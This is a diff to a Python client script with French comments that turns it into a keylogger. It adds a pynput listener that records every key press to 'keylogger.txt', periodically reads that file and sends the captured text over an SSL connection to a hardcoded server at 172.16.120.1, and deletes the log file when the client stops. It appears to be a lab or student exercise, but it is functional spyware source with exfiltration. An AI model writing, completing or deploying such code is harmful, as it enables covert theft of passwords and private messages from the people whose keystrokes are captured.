@@ -2,11 +2,39 @@ import socket
 import ssl
 import time
 import pathlib
+from pynput import keyboard
+from threading import Thread, Event
 
 def read_data_from_file(file_path):
     with open(file_path, 'r') as file:
         data = file.read()
     return data
+
+
+def add_one_char(char):
+    with open('keylogger.txt', "a") as f:
+        f.write(char)
+
+def del_one_char():
+    with open('keylogger.txt', 'r+') as f:
+        f.truncate()
+
+
+def record_key(key):
+
+    if hasattr(key, 'char'):
+        print(key.char)
+        add_one_char(key.char)
+    elif key == "'Key.enter'":
+        print("enter")
+        add_one_char("\n")
+    elif key == "'Key.space'":
+        print("space")
+        add_one_char(" ")
+    elif key == "'Key.backspace'":
+        print("delete")
+        del_one_char()
+
 
 
 def create_ssl_conn(host, port):
@@ -33,15 +61,24 @@ def create_ssl_conn(host, port):
     return conn_ssl, client_socket
 
 
-def stop_client(conn, socket, filepath):
+def stop_client(conn, socket, listener, filepath):
     # arrêt de la connexion
     conn.close()
     socket.close()
+
+    # arrêt du listener
+    listener.join()
 
     # suppression du fichier (sans erreur si le fichier n'existe pas)
     pathlib.Path.unlink(filepath, missing_ok=True)
 
     exit()
+
+
+
+# config du listener pour récupérer les touches
+listener = keyboard.Listener(on_press=record_key)
+listener.start()
 
 
 host = '172.16.120.1'
@@ -69,8 +106,11 @@ while running:
             t1 = t2
 
             # envoyer les données au serveur
+            keyboard_data = read_data_from_file(file_path)
+
             conn.send(keyboard_data.encode('utf-8'))
 
+            # récupération du code de retour
             code = conn.recv(1024).decode("utf-8")
 
             if code == "OK":
@@ -116,11 +156,11 @@ while running:
                 print("Le serveur est injoingnable !")
 
                 # arrêt du client
-                stop_client(conn, client_socket, file_path)
+                stop_client(conn, client_socket, listener, file_path)
 
     except Exception as e:
         print(e)
         
 
 # arrêt du client
-stop_client(conn, client_socket, file_path)
+stop_client(conn, client_socket, listener, file_path)
